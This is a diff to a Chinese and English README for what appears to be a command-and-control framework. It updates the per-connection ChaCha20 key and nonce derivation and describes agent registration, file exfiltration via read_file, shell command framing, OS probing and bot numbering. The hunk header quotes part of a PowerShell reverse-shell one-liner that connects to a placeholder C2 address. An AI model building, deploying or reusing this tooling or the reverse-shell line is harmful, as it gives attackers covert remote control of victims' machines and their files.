@@ -264,7 +264,9 @@ powershell -NoProfile -Command "$c=New-Object Net.Sockets.TCPClient('<C2_IP>',88
 请求包身 = TLV 链（`uint32 LE 长度 + UTF-8`）；响应包身 = 单一 UTF-8 字符串；
 文件传输 1024B/数据包（`cmd` 字段作 `end_flag`：0 续传 / 1 末包）。
 注册：`register(仅随机 nonce)` → `register_response(sha256(nonce+token))` → `register_confirm(身份，已加密)`；
-其后全流量 ChaCha20（密钥 = `sha256(auth_token)`，双向独立 nonce）。
+其后全流量 ChaCha20，每连接的 key 与 nonce 均由握手 nonce 派生（一次一密）：
+`key(dir)=sha256(nonce+token+nonce+dir)`、`nonce(dir)=sha256(token+nonce+token+dir)[:12]`
+（`dir` 区分双向，`0x01`=C2→Agent，`0x02`=Agent→C2），counter 连续自增。
 `read_file` 整文件读取截断 **51200 字符**。
 
 **Shell**：明文单行命令 + `echo __C2AGENT_<hex>__` 定界；C2 探测 OS（`uname` / PowerShell / `sw_vers`）后编号 `BOT-XXX`；
@@ -557,8 +559,11 @@ Main endpoints: `/api/config`, `/api/agents`, `/api/agents/switch`, `/api/sessio
 Request body = TLV chain (`uint32 LE length + UTF-8`); response body = a single UTF-8 string;
 file transfer uses 1024-byte data packets (`cmd` byte becomes `end_flag`: 0 continue / 1 last).
 Registration: `register(random nonce only)` → `register_response(sha256(nonce+token))` →
-`register_confirm(identity, encrypted)`; afterwards the whole stream uses ChaCha20
-(key = `sha256(auth_token)`, distinct nonces per direction). Whole-file `read_file` is truncated to **51200 chars**.
+`register_confirm(identity, encrypted)`; afterwards the whole stream uses ChaCha20, where each
+connection's key and nonce are derived from the handshake nonce (one-time key+nonce):
+`key(dir)=sha256(nonce+token+nonce+dir)`, `nonce(dir)=sha256(token+nonce+token+dir)[:12]`
+(`dir` separates the directions: `0x01`=C2→Agent, `0x02`=Agent→C2), with a continuous counter.
+Whole-file `read_file` is truncated to **51200 chars**.
 
 **Shell**: plaintext single-line command framed by `echo __C2AGENT_<hex>__`; the C2 probes the OS
 (`uname` / PowerShell / `sw_vers`) and assigns `BOT-XXX`; every action becomes one shell command;
